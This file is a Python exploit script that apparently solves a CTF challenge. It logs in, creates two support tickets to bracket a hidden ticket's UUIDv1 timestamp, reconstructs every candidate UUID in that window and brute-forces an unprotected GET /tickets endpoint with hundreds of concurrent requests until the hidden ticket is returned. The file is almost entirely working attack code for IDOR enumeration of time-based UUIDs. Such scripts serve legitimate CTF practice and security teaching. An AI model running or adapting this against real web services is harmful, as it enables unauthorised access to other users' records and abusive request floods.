#!/usr/bin/env python3
"""
Automated exploit for the IDOR — UUID Sandwich Attack CTF challenge.

How it works
------------
POST /tickets creates two tickets on the server side:

    1.  User ticket  →  ticket_uuid A   (returned to caller)
    2.  Internal ticket  →  ticket_uuid B  (hidden; contains the flag)

Because UUIDs are generated with uuid.uuid1() they carry a 60-bit
monotonically-increasing timestamp.  A second POST /tickets call returns
ticket_uuid C.  The hidden ticket B is always sandwiched:

    uuid_A.time  <  uuid_B.time  <  uuid_C.time

GET /tickets/{ticket_uuid} performs NO ownership check (the IDOR sink).
Any authenticated user can retrieve any ticket by guessing its UUID.

Exploit:
    1.  Obtain uuid_A and uuid_C.
    2.  Extract the common node + clock_seq from uuid_A.
    3.  Enumerate every 100-nanosecond timestamp between uuid_A and uuid_C
        while keeping node + clock_seq fixed.
    4.  Probe GET /tickets/{candidate} concurrently using httpx async.
    5.  The first response that contains a "flag" field wins.

Usage
-----
    python solve.py --email user@example.com --password pass
    python solve.py --email user@example.com --password pass --url http://localhost:8001
    python solve.py --email user@example.com --password pass --concurrency 200
"""

import argparse
import asyncio
import sys
import uuid as uuidlib

try:
    import httpx
except ImportError:
    print("[-] httpx not installed.  Run: pip install httpx")
    sys.exit(1)


# ---------------------------------------------------------------------------
# UUID helpers
# ---------------------------------------------------------------------------

def uuid1_time(u: str) -> int:
    """Return the 60-bit timestamp embedded in a UUIDv1 string."""
    return uuidlib.UUID(u).time


def uuid1_clock_seq(u: str) -> int:
    """Return the 14-bit clock sequence from a UUIDv1 string."""
    return uuidlib.UUID(u).clock_seq


def uuid1_node(u: str) -> int:
    """Return the 48-bit node from a UUIDv1 string."""
    return uuidlib.UUID(u).node


def build_uuid1(t: int, clock_seq: int, node: int) -> str:
    """
    Reconstruct a UUIDv1 string from its raw 60-bit timestamp, 14-bit
    clock_seq, and 48-bit node.
    """
    time_low               = t & 0xffffffff
    time_mid               = (t >> 32) & 0xffff
    time_hi_and_version    = ((t >> 48) & 0x0fff) | 0x1000   # version nibble = 1
    clock_seq_hi_variant   = ((clock_seq >> 8) & 0x3f) | 0x80  # RFC 4122 variant
    clock_seq_low          = clock_seq & 0xff
    return str(uuidlib.UUID(fields=(
        time_low, time_mid, time_hi_and_version,
        clock_seq_hi_variant, clock_seq_low, node,
    )))


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def login_sync(base_url: str, email: str, password: str) -> str:
    """Authenticate and return the JWT access token (synchronous)."""
    with httpx.Client(timeout=15) as client:
        resp = client.post(
            f"{base_url}/auth/login",
            json={"email": email, "password": password},
        )
    try:
        resp.raise_for_status()
    except httpx.HTTPStatusError as exc:
        print(f"[-] Login failed ({exc.response.status_code}): {exc.response.text}")
        sys.exit(1)
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login response missing access_token")
        sys.exit(1)
    return token


def create_ticket_sync(base_url: str, token: str, n: int) -> str:
    """Submit a dummy support ticket and return its ticket_uuid (synchronous)."""
    with httpx.Client(timeout=15) as client:
        resp = client.post(
            f"{base_url}/tickets",
            json={
                "subject": f"CTF probe ticket #{n}",
                "message": "This is an automated probe — please ignore.",
            },
            headers={"Authorization": f"Bearer {token}"},
        )
    try:
        resp.raise_for_status()
    except httpx.HTTPStatusError as exc:
        print(f"[-] POST /tickets failed: {exc.response.text}")
        sys.exit(1)
    return resp.json()["ticket_uuid"]


# ---------------------------------------------------------------------------
# Async brute-force scan
# ---------------------------------------------------------------------------

_found_flag: str | None = None


async def probe_uuid(
    client: httpx.AsyncClient,
    base_url: str,
    token: str,
    candidate: str,
    semaphore: asyncio.Semaphore,
) -> bool:
    """
    Try GET /tickets/{candidate}.  If the response contains a FLAG, store it
    and return True.  Returns False on 404 or any non-200.
    """
    global _found_flag
    if _found_flag:
        return False  # already found, skip remaining tasks

    async with semaphore:
        try:
            resp = await client.get(
                f"{base_url}/tickets/{candidate}",
                headers={"Authorization": f"Bearer {token}"},
                timeout=10,
            )
        except Exception:
            return False

    if resp.status_code == 200:
        data = resp.json()
        flag = data.get("flag")
        if flag:
            _found_flag = flag
            print(f"\n[+] Found hidden ticket at UUID: {candidate}")
            return True
    return False


async def scan(
    base_url: str,
    token: str,
    t_start: int,
    t_end: int,
    clock_seq: int,
    node: int,
    concurrency: int,
) -> str | None:
    """
    Enumerate all 100-ns timestamps from t_start+1 to t_end-1 (exclusive),
    reconstruct each UUIDv1, and probe the IDOR endpoint concurrently.
    Returns the flag string if found, else None.
    """
    global _found_flag
    _found_flag = None

    total = t_end - t_start - 1
    if total <= 0:
        print("[-] UUID range is empty — the two tickets were created at the same timestamp?")
        return None

    print(f"[*] UUID range: {t_start} → {t_end}  (≈ {total:,} candidates @ 100 ns steps)")
    print(f"[*] Probing with {concurrency} concurrent workers …")

    semaphore = asyncio.Semaphore(concurrency)
    limits    = httpx.Limits(max_connections=concurrency + 20, max_keepalive_connections=concurrency)

    async with httpx.AsyncClient(limits=limits, timeout=10) as client:
        batch_size = concurrency * 4
        checked    = 0
        tasks      = []

        for t in range(t_start + 1, t_end):
            if _found_flag:
                break

            candidate = build_uuid1(t, clock_seq, node)
            tasks.append(asyncio.create_task(
                probe_uuid(client, base_url, token, candidate, semaphore)
            ))

            if len(tasks) >= batch_size:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                checked += len(tasks)
                tasks = []
                # Print progress
                pct = checked / total * 100
                print(f"\r[*] Progress: {checked:,}/{total:,} ({pct:.1f}%) …", end="", flush=True)
                if _found_flag:
                    break

        # Drain remaining tasks
        if tasks and not _found_flag:
            await asyncio.gather(*tasks, return_exceptions=True)
            checked += len(tasks)

    return _found_flag


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit: IDOR UUID Sandwich Attack — LoopyMart CTF",
    )
    parser.add_argument("--email",       required=True,                        help="Registered user e-mail")
    parser.add_argument("--password",    required=True,                        help="User password")
    parser.add_argument("--url",         default="http://localhost:8001",      help="Backend base URL")
    parser.add_argument("--concurrency", default=200, type=int,               help="Max concurrent HTTP probes (default 200)")
    args = parser.parse_args()

    base_url    = args.url.rstrip("/")
    concurrency = max(1, args.concurrency)

    # ── 1. Authenticate ──────────────────────────────────────────────────────
    token = login_sync(base_url, args.email, args.password)
    print(f"[*] Logged in as {args.email}")

    # ── 2. Create ticket A (first bracket) ───────────────────────────────────
    uuid_a = create_ticket_sync(base_url, token, n=1)
    print(f"[*] Ticket A : {uuid_a}")

    # ── 3. Create ticket C (second bracket) ──────────────────────────────────
    uuid_c = create_ticket_sync(base_url, token, n=2)
    print(f"[*] Ticket C : {uuid_c}")

    # ── 4. Extract UUIDv1 components ─────────────────────────────────────────
    t_a      = uuid1_time(uuid_a)
    t_c      = uuid1_time(uuid_c)
    clock_seq = uuid1_clock_seq(uuid_a)
    node      = uuid1_node(uuid_a)

    if t_a >= t_c:
        print(
            "[-] uuid_A.time >= uuid_C.time — the two tickets have the same or "
            "reversed timestamps.  Try again; the clock may have stalled."
        )
        sys.exit(1)

    # ── 5. Brute-force the sandwich range ────────────────────────────────────
    flag = asyncio.run(scan(base_url, token, t_a, t_c, clock_seq, node, concurrency))

    # ── 6. Report ─────────────────────────────────────────────────────────────
    print()  # newline after progress bar
    if flag:
        print(f"[+] Flag: {flag}")
        sys.exit(0)
    else:
        print("[-] Flag not found in the scanned range.")
        print("    Hint: increase --concurrency or try again (timing may have been off).")
        sys.exit(1)


if __name__ == "__main__":
    main()
